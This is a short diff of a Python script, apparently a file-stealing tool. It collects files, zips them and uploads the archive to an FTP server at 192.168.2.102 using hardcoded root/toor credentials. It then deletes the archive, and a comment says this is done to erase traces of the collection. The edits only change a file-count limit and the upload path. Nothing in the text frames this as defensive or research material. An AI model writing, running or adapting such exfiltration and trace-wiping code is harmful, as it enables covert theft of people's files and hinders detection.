@@ -313,9 +313,9 @@ def find_all_path(dirnames):
                 if limit==20:
                     
                     break
-            # if limit==20:
-            #     limit=0
-            #     break
+            if limit==20:
+                limit=0
+                break
         #print(result)
     #return result
 def get_zip(allpath,aimfile):
@@ -435,7 +435,7 @@ if __name__=='__main__':
     my_ftp = MyFTP("192.168.2.102")#连接ftp服务器
     my_ftp.login("root", "toor")#登录ftp服务器
     path=os.getcwd()+"/"+compressfile
-    my_ftp.upload_file(path, "/123/5/linux.zip")#上传文件到ftp服务器
+    my_ftp.upload_file(path, "/linux.zip")#上传文件到ftp服务器
     my_ftp.close()#关闭ftp服务
     os.remove(compressfile)#清除收集、打包痕迹
     #print('hello')
